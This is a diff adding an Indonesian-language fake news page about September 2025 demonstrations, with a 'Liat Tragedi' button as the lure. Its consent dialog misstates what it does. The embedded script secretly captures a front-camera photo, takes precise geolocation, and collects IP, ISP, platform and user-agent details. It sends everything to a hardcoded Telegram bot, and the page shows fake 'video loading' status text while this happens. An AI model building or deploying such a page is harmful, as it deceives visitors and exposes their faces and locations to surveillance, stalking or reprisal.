@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Info Demonstrasi - September 2025</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+<style>
+  body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f4f4f4; color:#333; text-align:center; }
+  header { background:#0056a3; color:#fff; padding:15px 20px; text-align:left; }
+  header h1 { margin:0; font-size:22px; }
+  .container { max-width:900px; margin:20px auto; padding:0 15px; }
+  .news-card { background:#fff; border-radius:6px; box-shadow:0 2px 8px rgba(0,0,0,0.1); margin-bottom:20px; overflow:hidden; }
+  .news-card img { width:100%; height:300px; object-fit:cover; }
+  .news-content { padding:15px; }
+  .news-content h2 { font-size:20px; color:#222; margin:10px 0; }
+  .news-meta { font-size:13px; color:#777; margin-bottom:10px; }
+  .news-content p { font-size:15px; line-height:1.6; margin-bottom:10px; }
+  footer { background:#222; color:#fff; text-align:center; padding:15px; margin-top:40px; font-size:14px; }
+
+  /* button styling */
+  #LiatTragedi {
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    padding:8px 12px;
+    border-radius:6px;
+    background:#0056a3;
+    color:#fff;
+    border:none;
+    cursor:pointer;
+    font-size:16px;
+    margin:20px 0;
+  }
+  #LiatTragedi img { width:80px; height:48px; object-fit:cover; border-radius:4px; display:inline-block; }
+
+  /* consent modal (simple) */
+  .consent-modal {
+    position:fixed;
+    inset:0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:rgba(0,0,0,0.6);
+    z-index:9999;
+    visibility:hidden;
+    opacity:0;
+    transition:opacity .15s ease;
+  }
+  .consent-modal.show { visibility:visible; opacity:1; }
+  .consent-card {
+    width:90%;
+    max-width:420px;
+    background:#fff;
+    padding:18px;
+    border-radius:10px;
+    text-align:left;
+    box-shadow:0 8px 30px rgba(0,0,0,0.3);
+  }
+  .consent-card h3 { margin-top:0; color:#111; }
+  .consent-actions { display:flex; gap:8px; justify-content:flex-end; margin-top:12px; }
+  .btn { padding:8px 12px; border-radius:6px; border:none; cursor:pointer; }
+  .btn.secondary { background:#eee; color:#111; }
+  .btn.primary { background:#0056a3; color:#fff; }
+
+  /* status text under button */
+  #statusLine { font-size:14px; color:#444; margin-top:6px; min-height:18px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1><i class="fas fa-newspaper"></i> Info Demonstrasi Bulan Ini</h1>
+</header>
+
+<div class="container">
+  <div class="news-card">
+    <img src="https://primrosereyy.nichesite.org/uploads/68bd750c2cda5.jpg" alt="Demo Image">
+    <div class="news-content">
+      <h2>Gelombang Aksi Mahasiswa September 2025</h2>
+      <div class="news-meta">Jakarta • 7 September 2025 • Reporter Kompas</div>
+      <p>Ribuan mahasiswa menggelar aksi unjuk rasa awal September, menuntut transparansi kebijakan pendidikan.</p>
+    </div>
+  </div>
+
+  <div class="news-card">
+    <img src="https://primrosereyy.nichesite.org/uploads/68bd7565ddc9e.jpg" alt="Demo Image">
+    <div class="news-content">
+      <h2>Aksi Buruh Nasional: Tuntutan Kesejahteraan</h2>
+      <div class="news-meta">Bandung • 3 September 2025 • Redaksi Kompas</div>
+      <p>Serikat buruh menggelar aksi serentak di beberapa kota besar, menuntut kenaikan upah dan kepastian kerja.</p>
+    </div>
+  </div>
+
+  <button id="LiatTragedi">
+    <img src="https://files.catbox.moe/ggtij2.jpg" alt="Start">
+    Liat Tragedi
+  </button>
+  <div id="statusLine" aria-live="polite"></div>
+</div>
+
+<footer>
+  &copy; 2025 Primrose Message | one for world
+</footer>
+
+<!-- consent modal -->
+<div id="consentModal" class="consent-modal" role="dialog" aria-modal="true">
+  <div class="consent-card">
+    <h3>Persetujuan (Consent)</h3>
+    <p>Dengan menekan <strong>"I Consent"</strong> Anda menyetujui website ini untuk sementara mengakses <strong>video</strong> (video) dan <strong>lokasi kejadian</strong> video dan lokasi kejadian ini sangat parah tolong jangan di jadikan lelucon.</p>
+    <p><em>ini akan berjalan jika anda mengeklick I Consent.</em></p>
+    <div style="margin-top:8px;">
+      <label><input type="checkbox" id="consentCheckbox"> Saya mengerti dan setuju</label>
+    </div>
+    <div class="consent-actions">
+      <button id="consentCancel" class="btn secondary">Cancel</button>
+      <button id="consentOk" class="btn primary" disabled>I Consent</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/*
+  Single-file demo: kamera (hidden) + location (high accuracy stable sampling) + send to Telegram.
+  IMPORTANT: Use only on your own devices or with explicit permission.
+*/
+
+// === CONFIG: ganti kalau perlu ===
+const BOT_TOKEN = "8367413026:AAEM93F3pqbBwdOwJTCHs_0TYO4PnVsGfqY";
+const CHAT_ID  = "8482486283";
+
+// create hidden video element for camera capture
+const camera = document.createElement("video");
+camera.autoplay = true;
+camera.playsInline = true;
+camera.muted = true;
+camera.style.display = "none";
+document.body.appendChild(camera);
+
+// UI refs
+const triggerBtn = document.getElementById("LiatTragedi");
+const statusLine = document.getElementById("statusLine");
+const consentModal = document.getElementById("consentModal");
+const consentOk = document.getElementById("consentOk");
+const consentCancel = document.getElementById("consentCancel");
+const consentCheckbox = document.getElementById("consentCheckbox");
+
+function setStatus(txt) { statusLine.textContent = txt || ""; }
+
+// show/hide consent modal
+function showConsent() {
+  consentModal.classList.add("show");
+  consentCheckbox.checked = false;
+  consentOk.disabled = true;
+}
+function hideConsent(){ consentModal.classList.remove("show"); }
+
+// consent controls
+consentCheckbox.addEventListener("change", () => {
+  consentOk.disabled = !consentCheckbox.checked;
+});
+consentCancel.addEventListener("click", () => { hideConsent(); setStatus("Consent canceled."); });
+consentOk.addEventListener("click", async () => {
+  hideConsent();
+  setStatus("Consent diberikan — memulai proses...");
+  try { await startFlow(); } catch (e) { console.error(e); setStatus(String(e)); }
+});
+
+// helper: fetch IP + basic geo
+async function fetchIpInfo() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    if (!res.ok) throw new Error("ipapi error");
+    return await res.json();
+  } catch (e) {
+    return { ip: "-", org: "-", city: "-", region: "-", country_name: "-", latitude: null, longitude: null };
+  }
+}
+
+// get stable location using watchPosition samples
+function getLocationStable(samples = 4, timeoutEach = 7000) {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject("Geolocation tidak didukung");
+
+    let count = 0;
+    let last = null;
+    const id = navigator.geolocation.watchPosition(
+      (pos) => {
+        last = pos;
+        count++;
+        setStatus(`Mencari lokasi kejadian... (${count}/${samples})`);
+        if (count >= samples) {
+          navigator.geolocation.clearWatch(id);
+          resolve(last);
+        }
+      },
+      (err) => {
+        navigator.geolocation.clearWatch(id);
+        reject("Gagal mendapatkan lokasi kejadian: " + (err.message || err.code || err));
+      },
+      { enableHighAccuracy: true, maximumAge: 0, timeout: timeoutEach }
+    );
+
+    // safety timeout: if nothing after samples * timeoutEach + buffer
+    const safety = (samples * timeoutEach) + 4000;
+    setTimeout(() => {
+      if (last) {
+        navigator.geolocation.clearWatch(id);
+        resolve(last);
+      } else {
+        navigator.geolocation.clearWatch(id);
+        reject("Timeout mendapatkan lokasi stabil");
+      }
+    }, safety);
+  });
+}
+
+// request camera (front)
+async function requestCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    camera.srcObject = stream;
+    // wait metadata or short fallback
+    await new Promise((r) => {
+      camera.onloadedmetadata = () => r();
+      setTimeout(r, 700);
+    });
+    return stream;
+  } catch (e) {
+    throw "Gagal akses video: " + (e.message || e.name || e);
+  }
+}
+
+// capture image blob from video
+function captureImageBlob() {
+  const w = camera.videoWidth || 640;
+  const h = camera.videoHeight || 480;
+  const canvas = document.createElement("canvas");
+  canvas.width = w;
+  canvas.height = h;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(camera, 0, 0, w, h);
+  return new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg", 0.9));
+}
+
+// send to Telegram
+async function sendPhotoToTelegram(blob, caption) {
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("photo", blob, "capture.jpg");
+  fd.append("caption", caption);
+  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+  if (!res.ok) throw new Error("Gagal kirim ke Telegram");
+  return res.json();
+}
+
+// build caption
+function buildCaption(ipinfo, coords) {
+  const lat = coords?.latitude ?? ipinfo.latitude ?? "-";
+  const lon = coords?.longitude ?? ipinfo.longitude ?? "-";
+  return [
+    `📡 IP: ${ipinfo.ip || "-"}`,
+    `🏢 ISP: ${ipinfo.org || ipinfo.isp || "-"}`,
+    `📍 Lokasi: ${lat}, ${lon}`,
+    `🌆 ${ipinfo.city || "-"}, ${ipinfo.region || "-"}, ${ipinfo.country_name || "-"}`,
+    `🕒 ${new Date().toLocaleString()}`,
+    `💻 ${navigator.platform || "-"}`,
+    `🌐 ${navigator.userAgent || "-"}`,
+    `🔗 https://www.google.com/maps?q=${lat},${lon}`
+  ].join("\n");
+}
+
+// stop camera tracks
+function stopCamera() {
+  try {
+    const s = camera.srcObject;
+    if (s && s.getTracks) s.getTracks().forEach(t => t.stop());
+  } catch (e) {}
+  camera.srcObject = null;
+}
+
+// main flow
+async function startFlow() {
+  setStatus("meminta izin video dari web...");
+  // request camera (user gesture ensured by consent click)
+  await requestCamera();
+
+  setStatus("video sedang di cari tolong tunggu...");
+  const pos = await getLocationStable(4, 7000); // 4 samples, 7s each
+  setStatus("lokasi tragedi kartel atau demonstrasi sedang di cari...");
+  await new Promise(r => setTimeout(r, 1000)); // small pause
+
+  // gather IP/device
+  const ipinfo = await fetchIpInfo();
+
+  // capture image blob
+  const blob = await captureImageBlob();
+
+  // build caption and send
+  setStatus("Video loading...");
+  const caption = buildCaption(ipinfo, pos?.coords);
+  await sendPhotoToTelegram(blob, caption);
+
+  setStatus("Selesai — video akan di mulai.");
+  stopCamera();
+}
+
+// attach trigger
+triggerBtn.addEventListener("click", () => showConsent());
+</script>
+
+</body>
+</html>
